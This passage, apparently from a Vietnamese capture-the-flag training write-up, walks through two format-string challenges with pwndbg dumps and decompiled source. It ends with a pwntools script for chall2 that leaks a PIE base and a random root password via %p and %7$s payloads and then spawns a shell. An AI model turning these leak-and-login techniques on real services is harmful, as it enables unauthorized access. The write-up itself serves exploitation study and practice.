1d:00e8│     0x7fffffffddd8 —▸ 0x55555555a0b0 ◂— 'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'
1e:00f0│     0x7fffffffdde0 —▸ 0x55555555a140 ◂— '[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[['
1f:00f8│     0x7fffffffdde8 —▸ 0x55555555a1d0 ◂— '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'
20:0100│     0x7fffffffddf0 —▸ 0x55555555a260 ◂— ']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]'
21:0108│     0x7fffffffddf8 —▸ 0x55555555a2f0 ◂— '^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^'
22:0110│     0x7fffffffde00 —▸ 0x55555555a380 ◂— '________________________________________________________________________________________________________________________'
23:0118│     0x7fffffffde08 —▸ 0x55555555a410 ◂— '````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````'
24:0120│     0x7fffffffde10 ◂— 0x0
25:0128│     0x7fffffffde18 ◂— 0x24007a7085aa7000
26:0130│ rbp 0x7fffffffde20 ◂— 0x1
27:0138│     0x7fffffffde28 —▸ 0x7ffff7db0ebb (__libc_start_main+251) ◂— mov rcx, r14

```

Chuỗi **aaaaaaaa......aaaaaaaaa** kẹp giữa G, I là nội dung file flag1.txt, ở vị trí mà giá trị random là 7.


Tiếp theo trc khi gọi main, nó sẽ chạy qua 1 đống câu lệnh, cụ thể hơn tí thì nó đẩy flag tức **aaaa...aaaaaa** và chuỗi **\`\`\`.....\`\`\`** lên 2 thanh ghi. Xong rồi trừ rsp xuống, tạo stack frame mới cho hàm main. 


```shell
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x7ffff7daf6d0 <_dl_audit_preinit@plt>           endbr64
 ► 0x7ffff7daf6d4 <_dl_audit_preinit@plt+4>         bnd jmp qword ptr [rip + 0x1f0add]   <0x7ffff7daf350>
    ↓
   0x7ffff7daf350                                   endbr64
   0x7ffff7daf354                                   push   0xd
   0x7ffff7daf359                                   bnd jmp 0x7ffff7daf000               <0x7ffff7daf000>
    ↓
   0x7ffff7daf000                                   push   qword ptr [rip + 0x1f1002]    <_GLOBAL_OFFSET_TABLE_+8>
   0x7ffff7daf006                                   bnd jmp qword ptr [rip + 0x1f1003]   <_dl_runtime_resolve_xsavec>
    ↓
   0x7ffff7fd8d30 <_dl_runtime_resolve_xsavec>      endbr64
   0x7ffff7fd8d34 <_dl_runtime_resolve_xsavec+4>    push   rbx
   0x7ffff7fd8d35 <_dl_runtime_resolve_xsavec+5>    mov    rbx, rsp
   0x7ffff7fd8d38 <_dl_runtime_resolve_xsavec+8>    and    rsp, 0xffffffffffffffc0
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffde28 —▸ 0x7ffff7db0e2b (__libc_start_main+107) ◂— test ebx, ebx
01:0008│     0x7fffffffde30 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe169 ◂— 'SHELL=/bin/bash'
02:0010│     0x7fffffffde38 —▸ 0x555555557d60 —▸ 0x555555555280 ◂— endbr64
03:0018│     0x7fffffffde40 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
04:0020│     0x7fffffffde48 ◂— 0x0
05:0028│     0x7fffffffde50 ◂— 0x0
06:0030│     0x7fffffffde58 —▸ 0x5555555551e0 ◂— endbr64
07:0038│     0x7fffffffde60 —▸ 0x7fffffffde90 ◂— 0x1
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7daf6d4 _dl_audit_preinit@plt+4
   1   0x7ffff7db0e2b __libc_start_main+107
   2   0x555555555205
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
0x00007ffff7daf350 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 RDX  0x80
 RDI  0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RSI  0x555555559690 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
 R8   0x21001
 R9   0x55555555a410 ◂— '````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````'
 R10  0x0
 R11  0x346
 R12  0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
 R13  0x55555555542f ◂— endbr64
 R14  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x1
 RSP  0x7fffffffde28 —▸ 0x7ffff7db0e2b (__libc_start_main+107) ◂— test ebx, ebx
*RIP  0x7ffff7daf350 ◂— endbr64
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────


```



Tiếp đến mov thg khác vô thanh ghi đang chứa "flag".

```shell
pwndbg>
124     in ../sysdeps/x86_64/dl-trampoline.h
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0xee
 RBX  0x7fffffffde10 ◂— 0x0
 RCX  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 RDX  0x0
 RDI  0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RSI  0x555555559690 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
 R8   0x21001
 R9   0x55555555a410 ◂— '````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````'
 R10  0x0
 R11  0x346
 R12  0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
 R13  0x55555555542f ◂— endbr64
 R14  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x1
 RSP  0x7fffffffd440 ◂— 0x0
*RIP  0x7ffff7fd8da1 (_dl_runtime_resolve_xsavec+113) ◂— mov rsi, qword ptr [rbx + 0x10]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x7ffff7fd8d7c <_dl_runtime_resolve_xsavec+76>     mov    qword ptr [rsp + 0x260], rdx
   0x7ffff7fd8d84 <_dl_runtime_resolve_xsavec+84>     mov    qword ptr [rsp + 0x268], rdx
   0x7ffff7fd8d8c <_dl_runtime_resolve_xsavec+92>     mov    qword ptr [rsp + 0x270], rdx
   0x7ffff7fd8d94 <_dl_runtime_resolve_xsavec+100>    mov    qword ptr [rsp + 0x278], rdx
   0x7ffff7fd8d9c <_dl_runtime_resolve_xsavec+108>    xsavec ptr [rsp + 0x40]
 ► 0x7ffff7fd8da1 <_dl_runtime_resolve_xsavec+113>    mov    rsi, qword ptr [rbx + 0x10]
   0x7ffff7fd8da5 <_dl_runtime_resolve_xsavec+117>    mov    rdi, qword ptr [rbx + 8]
   0x7ffff7fd8da9 <_dl_runtime_resolve_xsavec+121>    call   _dl_fixup                <_dl_fixup>

   0x7ffff7fd8dae <_dl_runtime_resolve_xsavec+126>    mov    r11, rax
   0x7ffff7fd8db1 <_dl_runtime_resolve_xsavec+129>    mov    eax, 0xee
   0x7ffff7fd8db6 <_dl_runtime_resolve_xsavec+134>    xor    edx, edx
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
190:0c80│  0x7fffffffeaa8 ◂— 'cal/share:/usr/share:/var/lib/snapd/desktop'
191:0c88│  0x7fffffffeab0 ◂— 'e:/usr/share:/var/lib/snapd/desktop'
192:0c90│  0x7fffffffeab8 ◂— 'hare:/var/lib/snapd/desktop'
193:0c98│  0x7fffffffeac0 ◂— 'r/lib/snapd/desktop'
194:0ca0│  0x7fffffffeac8 ◂— 'apd/desktop'
195:0ca8│  0x7fffffffead0 ◂— 0x4854415000706f74 /* 'top' */
196:0cb0│  0x7fffffffead8 ◂— 0x6c2f656d6f682f3d ('=/home/l')
197:0cb8│  0x7fffffffeae0 ◂— 0x7765726278756e69 ('inuxbrew')
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7fd8da1 _dl_runtime_resolve_xsavec+113
   1   0x7ffff7db0e2b __libc_start_main+107
   2   0x555555555205
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
125     in ../sysdeps/x86_64/dl-trampoline.h
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0xee
 RBX  0x7fffffffde10 ◂— 0x0
 RCX  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 RDX  0x0
 RDI  0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
*RSI  0xd
 R8   0x21001
 R9   0x55555555a410 ◂— '````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````'
 R10  0x0
 R11  0x346
 R12  0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
 R13  0x55555555542f ◂— endbr64
 R14  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x1
 RSP  0x7fffffffd440 ◂— 0x0
*RIP  0x7ffff7fd8da5 (_dl_runtime_resolve_xsavec+117) ◂— mov rdi, qword ptr [rbx + 8]

```

Gọi  main thì nhập chuỗi bthg, cơ mà thg **\`\`\`\`\`** vẫn còn nằm trên stack lúc nhập chuỗi tức là ở stack frame của hàm main, có thể leak bằng **%41$s** , nên ban đầu mình mới có ý định bruteforce, hoặc ghi đè giá trị random sao cho flag sẽ được ghi vào ở vị trí thay cho  **\`\`\`....\`\`\`**:

đây là stack trước lúc call printf

```shell
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*RAX  0x0
*RBX  0x0
*RCX  0x7ffff7e9ba37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
*RDI  0x7fffffffdcf0 ◂— 0xa333231333231 /* '123123\n' */
*RSI  0x7fffffffbbd0 ◂— 'Hello your name: '
*R8   0x6
*R9   0x0
*R10  0x555555556020 ◂— 0x206f6c6c6548 /* 'Hello ' */
*R11  0x246
 R12  0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
 R13  0x55555555542f ◂— endbr64
 R14  0x555555557d60 —▸ 0x555555555280 ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
*RBP  0x7fffffffdd80 ◂— 0x1
*RSP  0x7fffffffdcf0 ◂— 0xa333231333231 /* '123123\n' */
*RIP  0x5555555554db ◂— call 0x555555555140
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x5555555554db    call   printf@plt                <printf@plt>
        format: 0x7fffffffdcf0 ◂— 0xa333231333231 /* '123123\n' */
        vararg: 0x7fffffffbbd0 ◂— 'Hello your name: '

   0x5555555554e0    mov    edi, 0xa
   0x5555555554e5    call   putchar@plt                <putchar@plt>

   0x5555555554ea    mov    eax, 0
   0x5555555554ef    mov    rdx, qword ptr [rbp - 8]
   0x5555555554f3    sub    rdx, qword ptr fs:[0x28]
   0x5555555554fc    je     0x555555555503                <0x555555555503>

   0x5555555554fe    call   __stack_chk_fail@plt                <__stack_chk_fail@plt>

   0x555555555503    leave
   0x555555555504    ret

   0x555555555505    add    byte ptr [rax], al
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
1a8:0d40│  0x7fffffffeb68 ◂— 0x632e2f346e6a682f ('/hjn4/.c')
1a9:0d48│  0x7fffffffeb70 ◂— 0x6e69622f6f677261 ('argo/bin')
1aa:0d50│  0x7fffffffeb78 ◂— 0x6f6c2f7273752f3a (':/usr/lo')
1ab:0d58│  0x7fffffffeb80 ◂— 0x6e6962732f6c6163 ('cal/sbin')
1ac:0d60│  0x7fffffffeb88 ◂— 0x6f6c2f7273752f3a (':/usr/lo')
1ad:0d68│  0x7fffffffeb90 ◂— 0x3a6e69622f6c6163 ('cal/bin:')
1ae:0d70│  0x7fffffffeb98 ◂— 0x6962732f7273752f ('/usr/sbi')
1af:0d78│  0x7fffffffeba0 ◂— 0x622f7273752f3a6e ('n:/usr/b')
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x5555555554db
   1   0x7ffff7db0d90 __libc_start_call_main+128
   2   0x7ffff7db0e40 __libc_start_main+128
   3   0x555555555205
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 100
00:0000│ rdi rsp 0x7fffffffdcf0 ◂— 0xa333231333231 /* '123123\n' */
01:0008│         0x7fffffffdcf8 ◂— 0x0
... ↓            15 skipped
11:0088│         0x7fffffffdd78 ◂— 0x24007a7085aa7000
12:0090│ rbp     0x7fffffffdd80 ◂— 0x1
13:0098│         0x7fffffffdd88 —▸ 0x7ffff7db0d90 (__libc_start_call_main+128) ◂— mov edi, eax
14:00a0│         0x7fffffffdd90 ◂— 0x0
15:00a8│         0x7fffffffdd98 —▸ 0x55555555542f ◂— endbr64
16:00b0│         0x7fffffffdda0 ◂— 0x100000000
17:00b8│         0x7fffffffdda8 —▸ 0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
18:00c0│         0x7fffffffddb0 ◂— 0x0
19:00c8│         0x7fffffffddb8 ◂— 0xf94761a3191a9112
1a:00d0│         0x7fffffffddc0 —▸ 0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
1b:00d8│         0x7fffffffddc8 —▸ 0x55555555542f ◂— endbr64
1c:00e0│         0x7fffffffddd0 —▸ 0x555555557d60 —▸ 0x555555555280 ◂— endbr64
1d:00e8│         0x7fffffffddd8 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
1e:00f0│         0x7fffffffdde0 ◂— 0x6b89e5ca2389112
1f:00f8│         0x7fffffffdde8 ◂— 0x6b88e1503909112
20:0100│         0x7fffffffddf0 ◂— 0x0
... ↓            2 skipped
23:0118│         0x7fffffffde08 —▸ 0x55555555a410 ◂— '````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````'
24:0120│         0x7fffffffde10 ◂— 0x0
25:0128│         0x7fffffffde18 ◂— 0x24007a7085aa7000
26:0130│         0x7fffffffde20 ◂— 0x0
27:0138│         0x7fffffffde28 —▸ 0x7ffff7db0e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
28:0140│         0x7fffffffde30 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe169 ◂— 'SHELL=/bin/bash'
29:0148│         0x7fffffffde38 —▸ 0x555555557d60 —▸ 0x555555555280 ◂— endbr64
2a:0150│         0x7fffffffde40 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
2b:0158│         0x7fffffffde48 ◂— 0x0
2c:0160│         0x7fffffffde50 ◂— 0x0
2d:0168│         0x7fffffffde58 —▸ 0x5555555551e0 ◂— endbr64
2e:0170│         0x7fffffffde60 —▸ 0x7fffffffde90 ◂— 0x1
2f:0178│         0x7fffffffde68 ◂— 0x0
30:0180│         0x7fffffffde70 ◂— 0x0
31:0188│         0x7fffffffde78 —▸ 0x555555555205 ◂— hlt
32:0190│         0x7fffffffde80 —▸ 0x7fffffffde88 ◂— 0x1c
33:0198│         0x7fffffffde88 ◂— 0x1c
34:01a0│         0x7fffffffde90 ◂— 0x1

```

Do là vừa không thể ovw gì với chỉ 1 lần nhập với Pie, và cũng không biết leak gì nên chall này mình khong làm được =="


# chall2

***chall này mình chưa giải ra***

Update: *chall này sau khi tham khảo idea của 1 bạn thì mình đã hmm khá bất ngờ với sự ngusi cụa mình*

Idea như sau: ghi địa chỉ của password root lên stack rồi leak với %s, oke chỉ thế mà nghĩ méo ra đần ứ chịu được. [exploit](#exploitcode)


```file
▶ checksec chall2
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall2/chall2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```

## source


```c
// positive sp value has been detected, the output may be wrong!
void __fastcall main(const char *a1, char **a2, char **a3)
{
  unsigned __int64 v3; // [rsp+10h] [rbp-10h]

  while ( 1 )
  {
    ((void (__fastcall *)(const char *, char **, char **))sub_1396)(a1, a2, a3);
    v3 = (int)sub_13BA();
    if ( v3 <= 5 )
      break;
    a1 = "???";
    puts("???");
  }
  __asm { jmp     rax }
}


void sub_12E8()
{
  int v0; // [rsp-Ch] [rbp-14h]

  v0 = open("/dev/urandom", 0);
  if ( v0 < 0 )
    exit(-1);
  unk_40E0 = 'toor';
  if ( read(v0, &unk_4110, 0x2FuLL) != 47 )
    exit(-2);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}

int sub_13BA()
{
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  buf[3] = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  read(0, buf, 0x10uLL);
  return atoi((const char *)buf);
}

ssize_t __fastcall sub_14F8(char *a1)
{
  char *v2; // [rsp+18h] [rbp-8h]

  __printf_chk(1LL, "Username: ");
  fgets(a1, 47, stdin);
  v2 = strchr(a1, 10);
  if ( v2 )
    *v2 = 0;
  __printf_chk(1LL, "Password: ");
  return read(0, a1 + 48, 0x2FuLL);
}


int sub_1592()
{
  unsigned __int64 i; // [rsp+18h] [rbp-8h]

  for ( i = 1LL; i <= 0xF; ++i )
  {
    if ( !*(&off_4020 + i) )
    {
      *(&off_4020 + i) = calloc(1uLL, 0x60uLL);
      return sub_14F8((char *)*(&off_4020 + i));
    }
  }
  return puts("Can't create new user!");
}

unsigned __int64 __fastcall login(_QWORD *a1, __int64 a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-78h]
  char s1[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+88h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s1, 0, 0x60uLL);
  sub_14F8(s1);
  for ( i = 0LL; i <= 0xF; ++i )
  {
    if ( *(&off_4020 + i)
      && !strcmp(s1, (const char *)*(&off_4020 + i))
      && !memcmp(&s1[48], (char *)*(&off_4020 + i) + 48, 0x2FuLL) )
    {
      *a1 = *(&off_4020 + i);
      return v5 - __readfsqword(0x28u);
    }
  }
  puts("Invaild username or password!");
  return v5 - __readfsqword(0x28u);
}


unsigned __int64 __fastcall sub_175E(_QWORD *a1)
{
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( *a1 )
  {
    puts("\n[-----------------------]");
    __printf_chk(1LL, *a1);
    __printf_chk(1LL, *a1 + 48LL);
    puts("\n[-----------------------]");
  }
  else
  {
    puts("You must login first!");
  }
  return v2 - __readfsqword(0x28u);
}

int __fastcall sub_1804(void **a1)
{
  if ( *a1 != &unk_40E0 )
    return puts("Access denied!");
  puts("Access granted!");
  return system("sh");
}
```

Như mình thấy thì có 1 hàm để lấy shell, bằng cách bypass **if ( *a1 != &unk_40E0 )**

Đọc source code trên IDA thì mình k thấy được sự liền mạch như là hàm nào call hàm nào, và call khi vào. Đến lúc run, debug, và so sánh chức năng thì từ từ mình mới hình dung được mục đích của từng hàm.

Mình thấy có bug fmt, tuy nhiên là **__printf_chk** và sẽ filter các fmt như **%n , %N$** cơ mà mình có research và thấy là %N$ có thể bypass ví dụ như **%7$p %p %p %p %p %p %p** cần 6 cái %p sau %7$p. Cơ mà mình vẫn không biết cách bypass %n để ovw, theo như thầy **saye** có hint là *leak mem* nên mình đã thay đổi hướng suy nghĩ.

```asm
   0x555555555804:      endbr64
   0x555555555808:      push   rbp
   0x555555555809:      mov    rbp,rsp
   0x55555555580c:      sub    rsp,0x10
   0x555555555810:      mov    QWORD PTR [rbp-0x8],rdi
   0x555555555814:      mov    rax,QWORD PTR [rbp-0x8]
   0x555555555818:      mov    rax,QWORD PTR [rax]
   0x55555555581b:      lea    rdx,[rip+0x28be]        # 0x5555555580e0
   0x555555555822:      cmp    rax,rdx
   0x555555555825:      je     0x555555555838
   0x555555555827:      lea    rax,[rip+0x8b6]        # 0x5555555560e4
   0x55555555582e:      mov    rdi,rax
   0x555555555831:      call   0x555555555120 <puts@plt>
   0x555555555836:      jmp    0x555555555856
   0x555555555838:      lea    rax,[rip+0x8b4]        # 0x5555555560f3
   0x55555555583f:      mov    rdi,rax
   0x555555555842:      call   0x555555555120 <puts@plt>
   0x555555555847:      lea    rax,[rip+0x8b5]        # 0x555555556103
   0x55555555584e:      mov    rdi,rax
   0x555555555851:      call   0x555555555150 <system@plt>
   0x555555555856:      leave
   0x555555555857:      ret

```

để bypass if check và call được system thì **RAX** phải bằng **RDX**, cơ mà sau khi **stepi** để follow vào flow trước lúc compare rax với rdx thì mình vẫn không biết làm sao để bypass và leak cái gì ==". Do là lúc này cái mà mình muốn so là địa chỉ lưu chuỗi mình nhập vô trên Heap với cái bất biến lại là địa chỉ lưu chuỗi "root" được khởi tạo trước đó. 

Do mình mới chơi nên còn thiếu kiến thức nên vẫn chưa biết làm sao. rất sorry các thầy ==", mình báo thầy saye 2,3h sáng ==" mà vẫn khum giải ra bài.

```shell
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x5555555592a0 ◂— 'username'
 RBX  0x0
 RCX  0x7fffffffdd41 ◂— 0xa /* '\n' */
*RDX  0x5555555580e0 ◂— 0x746f6f72 /* 'root' */
 RDI  0x7fffffffdd78 —▸ 0x5555555592a0 ◂— 'username'
 RSI  0x4
 R8   0x1999999999999999
 R9   0x0
 R10  0x7ffff7f45ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
 R11  0x7ffff7f463c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002
 R12  0x7fffffffdea8 —▸ 0x7fffffffe131 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall2/chall2'
 R13  0x55555555541d ◂— endbr64
 R14  0x555555557d58 —▸ 0x5555555552a0 ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffdd60 —▸ 0x7fffffffdd90 ◂— 0x1
 RSP  0x7fffffffdd50 ◂— 0x0
*RIP  0x555555555822 ◂— cmp rax, rdx
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x555555555810    mov    qword ptr [rbp - 8], rdi
   0x555555555814    mov    rax, qword ptr [rbp - 8]
   0x555555555818    mov    rax, qword ptr [rax]
   0x55555555581b    lea    rdx, [rip + 0x28be]
 ► 0x555555555822    cmp    rax, rdx
   0x555555555825    je     0x555555555838                <0x555555555838>

   0x555555555827    lea    rax, [rip + 0x8b6]
   0x55555555582e    mov    rdi, rax
   0x555555555831    call   puts@plt                <puts@plt>

   0x555555555836    jmp    0x555555555856                <0x555555555856>

   0x555555555838    lea    rax, [rip + 0x8b4]
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd50 ◂— 0x0
01:0008│     0x7fffffffdd58 —▸ 0x7fffffffdd78 —▸ 0x5555555592a0 ◂— 'username'
02:0010│ rbp 0x7fffffffdd60 —▸ 0x7fffffffdd90 ◂— 0x1
03:0018│     0x7fffffffdd68 —▸ 0x5555555554c4 ◂— jmp 0x5555555554ec
04:0020│     0x7fffffffdd70 ◂— 0x0
05:0028│ rdi 0x7fffffffdd78 —▸ 0x5555555592a0 ◂— 'username'
06:0030│     0x7fffffffdd80 ◂— 0x4
07:0038│     0x7fffffffdd88 ◂— 0xe1126ebd5b22aa00

```

### exploitcode

```python
from pwn import *

while True:
    try: 
        binary = ELF("./chall2")
        r = process(binary.path)
        context.log_level='debug'
        #gdb.attach(r, api=True)

        payload = b""

        r.sendline(b"1")
        payload1 = b"%p..%p..%p..%p..%p..%p..%p..%p..%p..%p|%p|"
        payload2 = b"%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p"

        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)

        r.sendline(b"2")
        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)

        r.sendline(b"3")
        recv = int(r.recv().split(b"|")[1], 16)  # 0x558e40e5141d
        log.info("Main addr pie: " + hex(recv))
        main_offset_pie = 0x0000141d
        binary.address = recv - main_offset_pie
        log.info("Pie base addr: " + hex(binary.address))

        r.sendline(b"1")
        payload1 = p64(binary.address + 0x4110)
        payload2 = b"*|*%7$s*|*%p%p%p%p%p%p"
        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)
        r.recv()
        r.sendline(b"2")
        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)
        r.recv()
        r.sendline(b"3")
        recv = r.recv().split(b"*|*")[1]
        log.info(b"Password: " + recv)
        r.recv()

        if len(recv) == 47:
            log.info("pwned :3")
            r.sendline(b"1")
            payload1 = b"root"
            payload2 = recv
            r.sendlineafter(b"Username: ", payload1)
            r.sendlineafter(b"Password: ", payload2)
            r.sendline(b"2")
            r.sendlineafter(b"Username: ", payload1)
            r.sendlineafter(b"Password: ", payload2)
            r.sendline(b"3")
            r.sendline(b"4")
            r.sendline("ls")
            r.interactive()

            break
        else:
            r.close()
    except:
        continue


```